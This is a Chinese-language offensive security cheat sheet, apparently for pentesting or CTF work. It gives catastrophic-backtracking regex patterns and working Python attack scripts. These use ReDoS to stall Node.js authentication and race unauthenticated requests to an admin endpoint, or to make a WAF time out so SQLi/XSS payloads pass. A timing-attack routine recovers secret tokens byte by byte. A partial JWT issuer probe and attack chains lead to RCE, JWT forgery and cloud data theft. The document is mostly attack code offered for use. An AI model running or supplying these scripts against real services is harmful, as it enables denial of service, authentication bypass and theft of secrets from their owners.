# ReDoS & 时序攻击

## Catastrophic Backtracking (ReDoS)

```python
# 恶意正则构造 — 指数级回溯
EVIL_REGEX_PATTERNS = {
    # 模式 A: (a+)+$ — 嵌套量词
    # "aaaaaaaaaaaaaaaaaaaa!"  → 回溯 2^n 次
    "nested_plus": r"(a+)+$",
    "nested_star": r"(a*)*$",
    "alt_group": r"(a|aa)+$",
    "group_ref": r"(\w+)=(\w+)*",

    # 模式 B: 实际 WAF/库中的 ReDoS 漏洞
    "email_validation": r"^([a-zA-Z0-9_\-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{2,}|[0-9]{1,3})(\]?)$",

    # 模式 C: 路径匹配 — Nginx/Apache rewrite rules
    "path_rewrite": r"^(/[^/]+)+\/?$",
}
```

## ReDoS → Auth Bypass (Node.js)

```python
# Node.js 单线程 event loop → ReDoS 阻塞整个进程
# 在认证检查卡住时，并发发送未认证请求 → 可能通过

import concurrent.futures, requests, time

def redos_auth_bypass(target: str, evil_input: str):
    """利用 ReDoS 卡住认证检查，并发发送未认证请求"""
    results = []

    def send_unauthorized():
        r = requests.get(f"{target}/admin/flag",
            headers={"Authorization": "Bearer invalid"})
        return ("unauth", r.status_code, r.text[:50])

    def trigger_redos():
        # 提交触发 ReDoS 的输入
        r = requests.post(f"{target}/api/validate", json={
            "email": evil_input   # 触发正则回溯
        })
        return ("redos", r.status_code, r.text[:50])

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        # 先发 5 个 ReDoS 请求
        futures = [ex.submit(trigger_redos) for _ in range(5)]
        # 同时发 25 个未认证请求
        futures += [ex.submit(send_unauthorized) for _ in range(25)]

        for f in concurrent.futures.as_completed(futures):
            label, status, body = f.result()
            if label == "unauth" and status == 200:
                print(f"[!] AUTH BYPASS via ReDoS race!")
            results.append((label, status))
    return results
```

## ReDoS → WAF 绕过

```python
# WAF 在其正则引擎中检查 payload → 触发 ReDoS → WAF timeout → pass through

def waf_redos_bypass(waf_target: str, payload: str):
    """发送使 WAF 正则卡死的 payload"""
    # 在正常攻击 payload 前附加 ReDoS 触发器
    # 使 WAF 在到达真正的攻击 payload 前就超时
    redos_prefix = "A" * 100 + "!"
    # WAF 正则: /^[a-zA-Z0-9 ]+$/
    # 输入: AAAA...!  → 回溯 → 超时 → WAF skip

    r = requests.post(waf_target, data={
        "input": redos_prefix + payload
    })
    return r
```

## 时序攻击 — Token/Key 逐字节恢复

```python
# 非恒定时间比较 → 逐字节泄露
import time, statistics

def timing_attack_byte(target_url: str, known_prefix: str,
                       charset: str = "abcdefghijklmnopqrstuvwxyz0123456789",
                       samples: int = 30):
    """统计时序攻击恢复下一个字节"""
    times = {}

    for ch in charset:
        test = known_prefix + ch
        measurements = []
        for _ in range(samples):
            start = time.perf_counter()
            r = requests.get(target_url, params={"token": test})
            end = time.perf_counter()
            measurements.append((end - start) * 1_000_000)  # 微秒

        # 去掉明显异常值
        measurements.sort()
        trimmed = measurements[3:-3]  # 去掉最高/最低 3 个
        times[ch] = statistics.mean(trimmed)

    # 正确的字节应该多一次比较 → 略慢
    # 找出显著慢的
    baseline = statistics.median(list(times.values()))
    for ch, t in times.items():
        if t > baseline * 1.5:  # 50% 以上的差异
            print(f"[!] Next byte: {ch} ({t:.1f}μs vs baseline {baseline:.1f}μs)")
            return ch
    return None

# 使用:
# known = ""
# for i in range(32):
#     next_byte = timing_attack_byte("https://target.com/verify", known)
#     if next_byte:
#         known += next_byte
#     else:
#         break
# print(f"Recovered token: {known}")
```

## JWT HS256 Key 时序泄露

```python
# Go 的 == 操作符在 JWT library 中非恒定时间比较 iss/aud
# → 可泄露 trusted issuer URL
# 类似: Node.js crypto.timingSafeEqual 未使用时

def jwt_claim_timing_leak(token: str, target: str):
    """探测 JWT iss claim 的 trust list"""
    candidates = [
        "https://auth.google.com",
        "https://auth.target.com",
        "https://sso.internal",
        "https://okta.target.com",
    ]
    for iss in candidates:
        # 修改 token 中的 iss claim
        import jwt as pyjwt
        payload = pyjwt.decode(token, options={"verify_signature": False})
        payload["iss"] = iss
        # 用空 key 签名 + 发送
        # 正确 iss 的处理时间 vs 错误 iss 的处理时间有差异
        ...
```

## 攻击链

```
ReDoS → Node.js event loop 阻塞 → Auth bypass → Admin API
ReDoS → WAF timeout → SQLi/XSS payload pass through → RCE
Timing attack → CSRF token byte-by-byte → 完整 token → CSRF 攻击
Timing attack → HMAC key → JWT 伪造 → 任意用户
Timing attack → API key → cloud 资源访问 → 数据泄露
```

## Evidence

记录: 每字节采样时间分布 (均值/标准差/样本数)、ReDoS 触发时的事件循环阻塞时间、WAF 绕过证明
